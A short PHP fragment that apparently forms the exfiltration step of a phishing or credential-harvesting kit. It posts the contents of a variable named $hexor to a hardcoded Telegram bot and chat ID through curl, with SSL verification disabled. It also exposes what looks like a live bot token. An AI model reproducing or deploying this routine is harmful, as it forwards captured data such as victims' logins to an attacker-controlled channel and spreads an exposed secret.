<?php 
$botToken="6852429930:AAGsWk3j6RZKQP5l2M8r6lb_TU_r2VlCJI";
$chatId="-4244546485";  

  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$hexor,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
